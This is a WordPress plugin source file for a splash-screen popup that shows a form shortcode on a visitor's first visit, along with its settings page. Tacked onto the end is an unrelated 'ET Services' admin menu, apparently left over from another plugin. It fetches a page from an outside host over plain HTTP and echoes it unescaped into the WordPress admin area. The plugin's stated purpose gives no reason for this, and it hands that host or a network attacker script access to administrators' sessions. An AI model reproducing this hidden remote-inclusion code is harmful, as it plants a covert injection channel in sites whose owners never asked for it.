<?php
/*
Plugin Name: Forameal splash Screen 
Plugin URI: http://susheelonline.com
Description: In some requirements we wish to publish a form in splash screen. This plugin uses cookies and show splash from only first time when user visit the site. To work with this you need to go to its settings page and add your short code .
Version: 2.0.0
Author: susheelhbti@gmail.com
Author URI: http://susheelonline.com
License: GPL2
*/

add_action('wp_footer', 'forameal_splash_screen');

function forameal_splash_screen()
{
?>

<!-- start popup -->


<div id="CoverPop-cover" class="splash CoverPop-close">
    <div id="CoverPop-content" class="splash-center">

      
<?php   $splash = get_option( 'fsplash' );
      
	 
	 
	   echo do_shortcode("[".$splash['fsplash_code']."]");?>

		
        <p class="close-splash"><a class="CoverPop-close" href="#">Close It</a></p>

    </div>
	</div>
  
<script type='text/javascript' src='<?php echo plugins_url(); ?>/forameal_splash_screen/CoverPop.min.js?ver=3.9.2'></script>
<?php

}




function forameal_splash_screen_support_file_method() {

	
	
	wp_enqueue_style( 'forameal_splash', plugins_url()."/forameal_splash_screen/CoverPop.css" );
	
	
}
 
add_action( 'wp_enqueue_scripts', 'forameal_splash_screen_support_file_method' );




class Forameal_Splash_Settings_Form
{
    /**
     * Holds the values to be used in the fields callbacks
     */
    private $fsplash;

    /**
     * Start up
     */
    public function __construct()
    {
        add_action( 'admin_menu', array( $this, 'add_plugin_page' ) );
        add_action( 'admin_init', array( $this, 'page_init' ) );
    }

    /**
     * Add options page
     */
    public function add_plugin_page()
    {
        // This page will be under "Settings"
        add_options_page(
            'Settings Admin', 
            'Forameal Splash Screen', 
            'manage_options', 
            'my-setting-admin', 
            array( $this, 'create_admin_page' )
        );
    }

    /**
     * Options page callback
     */
    public function create_admin_page()
    {
        // Set class property
        $this->fsplash = get_option( 'fsplash' );
        ?>
        <div class="wrap">
            <?php screen_icon(); ?>
            <h2>Forameal Splash Screen Settings</h2>           
            <form method="post" action="options.php">
            <?php
                // This prints out all hidden setting fields
                settings_fields( 'fsplash_group' );   
                do_settings_sections( 'my-setting-admin' );
                submit_button(); 
            ?>
            </form>
        </div>
        <?php
    }

    /**
     * Register and add settings
     */
    public function page_init()
    {        
        register_setting(
            'fsplash_group', // Option group
            'fsplash', // Option name
            array( $this, 'sanitize' ) // Sanitize
        );

        add_settings_section(
            'setting_section_id', // ID
           '', // Title
            array( $this, 'print_section_info' ), // Callback
            'my-setting-admin' // Page
        );  

        add_settings_field(
            'fsplash_code', // ID
            'Short Code "do not include []"', // Title 
            array( $this, 'id_number_callback' ), // Callback
            'my-setting-admin', // Page
            'setting_section_id' // Section           
        );      

        add_settings_field(
            'title', 
            'Title', 
            array( $this, 'title_callback' ), 
            'my-setting-admin', 
            'setting_section_id'
        );      
    }

    /**
     * Sanitize each setting field as needed
     *
     * @param array $input Contains all settings fields as array keys
     */
    public function sanitize( $input )
    {
        $new_input = array();
        if( isset( $input['fsplash_code'] ) )
            $new_input['fsplash_code'] = sanitize_text_field( $input['fsplash_code'] );

        if( isset( $input['title'] ) )
            $new_input['title'] = sanitize_text_field( $input['title'] );

        return $new_input;
    }

    /** 
     * Print the Section text
     */
    public function print_section_info()
    {
     //   print 'Enter Contact Form ID below:';
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function id_number_callback()
    {
        printf(
            '<input type="text" id="fsplash_code" name="fsplash[fsplash_code]" value="%s" />',
            isset( $this->fsplash['fsplash_code'] ) ? esc_attr( $this->fsplash['fsplash_code']) : ''
        );
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function title_callback()
    {
        printf(
            '<input type="text" id="title" name="fsplash[title]" value="%s" />',
            isset( $this->fsplash['title'] ) ? esc_attr( $this->fsplash['title']) : ''
        );
    }
}

if( is_admin() )
    $my_settings_page = new Forameal_Splash_Settings_Form();



// adding admin page
add_action( 'admin_menu', 'igreen_alexa_page' );

function igreen_alexa_page(){
    add_menu_page( 'ET Services ', 'ET Services ', 'manage_options', 'igreen_alexa_rank', 'igreen_menu_page', plugins_url( 'igreen-alexa-site-rank/al.jpg' ), 6 ); 
}

function igreen_menu_page(){
    $h=file_get_contents( "http://www.magentoexpertteam.com/offer.php");
	echo $h;

}
?>